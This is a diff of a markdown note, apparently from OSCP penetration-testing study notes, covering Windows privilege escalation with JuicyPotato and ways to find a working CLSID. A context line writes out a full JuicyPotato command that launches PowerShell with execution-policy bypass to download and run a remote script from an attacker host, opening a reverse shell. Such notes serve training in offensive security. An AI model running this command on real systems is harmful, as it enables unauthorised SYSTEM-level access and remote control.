@@ -8,9 +8,9 @@
 - Calling back using powershell reverse shell:
 `.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *`
 
-2. Default CLSID Not working:
+ 2. Default CLSID Not working:
 
-a. If Default Doesnt run, use the `GetCLSID.ps1` and `join-object.ps1` scripts from `Scripts/OSCP/Win_Enum/Priv_Esc_Method`
+ a. If Default Doesnt run, use the `GetCLSID.ps1` and `join-object.ps1` scripts from `Scripts/OSCP/Win_Enum/Priv_Esc_Method`
 
    - Load `join-object.ps1` into the powershell session using:
      `import-module join-object.ps1`
@@ -18,11 +18,11 @@ a. If Default Doesnt run, use the `GetCLSID.ps1` and `join-object.ps1` scripts f
    - Execute `GetCLSID.ps1` using:
      `.\GetCLSID.ps1`
 
-b. download the `test_clsid.bat` and configure the following before execution:
+ b. download the `test_clsid.bat` and configure the following before execution:
    - Change the path to the `CLSID.list` variable
      
    - execute the .bat file
      
    - when the port number changes, it signifies a working CLSID
 
-c. Test CLSID with JuicyPotato command. 
+ c. Test CLSID with JuicyPotato command. 
